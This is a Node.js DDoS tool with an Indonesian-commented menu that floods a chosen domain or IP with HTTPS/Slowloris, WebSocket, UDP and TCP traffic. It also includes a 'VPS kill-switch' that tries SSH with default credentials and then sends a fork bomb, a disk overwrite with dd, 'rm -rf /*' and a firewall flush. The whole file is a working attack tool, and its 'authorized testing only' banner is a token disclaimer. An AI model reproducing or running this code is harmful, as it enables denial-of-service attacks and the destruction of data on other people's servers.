const dns = require('dns');
const net = require('net');
const http = require('http');
const https = require('https');
const tls = require('tls');
const crypto = require('crypto');
const readline = require('readline');
const { exec } = require('child_process');

// ==================== BANNER ====================
console.log(`
╔══════════════════════════════════════════════════════════════╗
║  ██████  ██████  ██████  ███████  ██████  ██████  ███████   ║
║ ██      ██    ██ ██   ██ ██      ██    ██ ██   ██ ██        ║
║ ██      ██    ██ ██   ██ ███████ ██    ██ ██████  ███████   ║
║ ██      ██    ██ ██   ██      ██ ██    ██ ██   ██      ██   ║
║  ██████  ██████  ██████  ███████  ██████  ██   ██ ███████   ║
║                                                             ║
╠══════════════════════════════════════════════════════════════╣
║  [CORE77-X] DDoS HYBRID OVERPOWER EDITION - VIP ACCESS ONLY  ║
║  [WARNING] For authorized penetration testing only.          ║
╚══════════════════════════════════════════════════════════════╝
`);

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// ==================== MODULE SERANGAN ====================

// 1. HYBRID HTTPS FLOOD + SLOWLORIS
function httpsSlowloris(target, port, threads, duration) {
    console.log(`[+] Launching HTTPS Flood + Slowloris Hybrid to ${target}:${port}`);
    for (let i = 0; i < threads; i++) {
        setTimeout(() => {
            const req = https.request({
                hostname: target,
                port: port,
                path: '/',
                method: 'GET',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
            }, (res) => {
                // Biarin tetep nyala, makan resource
                res.on('data', () => {});
            });
            req.setTimeout(30000);
            req.on('error', () => {});
            req.end();

            // Slowloris: tahan koneksi
            setInterval(() => {
                req.write('X-a: b\r\n');
            }, 15000);
        }, i * 50);
    }
    setTimeout(() => {
        console.log(`[!] Attack on ${target} finished.`);
    }, duration * 1000);
}

// 2. WEBSOCKET RAMPAGE (jika target pakai WS)
function websocketRampage(target, port, threads) {
    console.log(`[+] Attempting WebSocket Rampage to ${target}:${port}`);
    const WebSocket = require('ws');
    for (let i = 0; i < threads; i++) {
        const ws = new WebSocket(`ws://${target}:${port}`);
        ws.on('open', () => {
            setInterval(() => {
                // Kirim frame garbage besar (64KB)
                ws.send(crypto.randomBytes(65536).toString('hex'));
            }, 100);
        });
        ws.on('error', () => {});
    }
}

// 3. UDP AMPLIFICATION (DNS/NTP)
function udpAmplify(targetIp, threads, duration) {
    console.log(`[+] UDP Amplification (DNS) to ${targetIp} - POWER OVERLOAD`);
    const dgram = require('dgram');
    const ampPayload = Buffer.alloc(4096, 'A'); // Payload besar

    for (let i = 0; i < threads; i++) {
        const socket = dgram.createSocket('udp4');
        // Spoof dari banyak IP berbeda
        const srcIp = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        // Target DNS server (bisa diganti NTP)
        const dnsServer = '8.8.8.8'; // Google DNS, response besar
        const port = 53;

        // Buat query DNS yang menghasilkan response besar
        const dnsQuery = Buffer.concat([
            Buffer.from([0x12, 0x34]), // ID
            Buffer.from([0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            Buffer.from('google.com', 'ascii'),
            Buffer.from([0x00, 0x00, 0x01, 0x00, 0x01])
        ]);

        // Kirim ke DNS server dengan spoofed source = target korban
        // (HATI-HATI: ini akan mengarahkan response besar ke target)
        // **Hanya untuk testing jaringan sendiri**
        socket.send(dnsQuery, 0, dnsQuery.length, port, dnsServer, (err) => {
            if (err) console.log(`[!] UDP Error: ${err.message}`);
        });

        // Juga kirim langsung payload besar ke target
        setInterval(() => {
            for (let j = 0; j < 100; j++) {
                socket.send(ampPayload, 0, ampPayload.length, 53, targetIp);
            }
        }, 10);
    }
    setTimeout(() => {
        console.log(`[!] UDP Amplification finished.`);
    }, duration * 1000);
}

// 4. TCP MULTI-FLOOD (SYN, ACK, PUSH)
function tcpMultiFlood(targetIp, targetPort, threads, duration) {
    console.log(`[+] TCP Multi-Flood (SYN+ACK+PUSH) to ${targetIp}:${targetPort}`);
    for (let i = 0; i < threads; i++) {
        // SYN Flood
        const synSocket = new net.Socket();
        synSocket.connect(targetPort, targetIp, () => {
            // ACK Flood: kirim data acak terus menerus
            setInterval(() => {
                synSocket.write(crypto.randomBytes(1024));
            }, 1);
        });
        synSocket.setTimeout(1000);
        synSocket.on('error', () => {});
        synSocket.on('timeout', () => synSocket.destroy());

        // Socket kedua untuk PUSH flood
        const pushSocket = new net.Socket();
        pushSocket.connect(targetPort, targetIp, () => {
            setInterval(() => {
                pushSocket.write('GET / HTTP/1.1\r\nHost: ' + targetIp + '\r\n\r\n');
            }, 5);
        });
        pushSocket.on('error', () => {});
    }
    setTimeout(() => {
        console.log(`[!] TCP Multi-Flood finished.`);
    }, duration * 1000);
}

// 5. VPS KILL-SWITCH (Digital Ocean khusus)
function vpsKillSwitch(ip, user = 'root', password = 'admin123') {
    console.log(`[!] ATTEMPTING VPS KILL-SWITCH on ${ip}`);
    // 5A. Bruteforce SSH (simulasi)
    console.log(`[*] Trying SSH brute-force on ${user}@${ip}`);
    exec(`sshpass -p '${password}' ssh -o StrictHostKeyChecking=no ${user}@${ip} "echo 'Kill-switch activated'"`, (err) => {
        if (!err) {
            console.log(`[+] SSH access granted to ${ip}`);
            // 5B. Fork bomb internal (simulasi perintah destruktif)
            const maliciousCommands = [
                ':(){ :|: & };:', // Fork bomb (bash)
                'dd if=/dev/zero of=/dev/sda bs=1M', // Overwrite disk
                'rm -rf /*', // Delete all files
                'iptables -F; iptables -X; iptables -t nat -F' // Hapus firewall
            ];
            maliciousCommands.forEach(cmd => {
                exec(`sshpass -p '${password}' ssh ${user}@${ip} "${cmd}"`, () => {});
            });
            console.log(`[!] Internal destruction commands sent.`);
        } else {
            console.log(`[-] SSH brute-force failed, fallback to external overload.`);
            // 5C. External DDoS ke semua port VPS
            for (let port = 1; port <= 65535; port += 100) {
                httpsSlowloris(ip, port, 50, 300);
                tcpMultiFlood(ip, port, 50, 300);
            }
        }
    });
}

// ==================== MENU UTAMA ====================
function mainMenu() {
    console.log(`
[1] DOMAIN/IP HYBRID ANNIHILATION
    -> Resolve domain ke IP, lalu serang dengan HTTPS Flood + WebSocket + UDP
[2] IP OMNIDIRECTIONAL OVERPOWER
    -> TCP Multi-Flood + UDP Amplification + Slowloris Hybrid
[3] DIGITAL OCEAN VPS KILL-SWITCH
    -> SSH Bruteforce + Internal Fork Bomb + External Port Saturation

[0] EXIT
    `);

    rl.question('Select menu: ', (choice) => {
        switch(choice) {
            case '1':
                rl.question('Enter DOMAIN or IP: ', (target) => {
                    rl.question('Threads (500-10000): ', (threads) => {
                        rl.question('Duration (seconds): ', (duration) => {
                            // Resolve domain ke IP
                            dns.lookup(target, (err, ip) => {
                                if (err) ip = target;
                                console.log(`[+] Target IP: ${ip}`);
                                httpsSlowloris(ip, 443, threads, duration);
                                websocketRampage(ip, 80, threads/2);
                                udpAmplify(ip, threads*2, duration);
                            });
                            rl.close();
                        });
                    });
                });
                break;
            case '2':
                rl.question('Enter IP: ', (ip) => {
                    rl.question('Threads (1000-20000): ', (threads) => {
                        rl.question('Duration (seconds): ', (duration) => {
                            tcpMultiFlood(ip, 80, threads, duration);
                            tcpMultiFlood(ip, 443, threads, duration);
                            udpAmplify(ip, threads*3, duration);
                            rl.close();
                        });
                    });
                });
                break;
            case '3':
                console.log(`[!] VPS KILL-SWITCH MODE`);
                rl.question('Enter VPS IP: ', (ip) => {
                    vpsKillSwitch(ip);
                    // Tambahkan external flood juga
                    tcpMultiFlood(ip, 22, 5000, 600);
                    udpAmplify(ip, 10000, 600);
                    rl.close();
                });
                break;
            case '0':
                console.log('[+] Exiting...');
                rl.close();
                break;
            default:
                console.log('[-] Invalid choice');
                mainMenu();
        }
    });
}

// ==================== JALANKAN ====================
mainMenu();